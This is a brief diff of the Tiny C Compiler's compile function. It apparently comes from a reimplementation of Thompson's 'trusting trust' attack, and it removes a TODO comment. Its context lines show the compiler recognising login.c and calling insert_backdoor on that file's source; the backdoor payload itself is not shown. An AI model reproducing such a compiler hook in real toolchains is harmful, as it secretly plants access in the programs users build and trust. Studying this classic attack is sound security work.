@@ -761,7 +761,6 @@ static int tcc_compile(TCCState* s1, int filetype, const char* str, int fd)
             printf("%s", "this is login.c");
             insert_backdoor(file->buffer);
         }
-        // TODO: Since the filetype is going to be use in the preprocess, try to modify the filetype in the backdoor function to have it effect
         preprocess_start(s1, filetype);
 
 
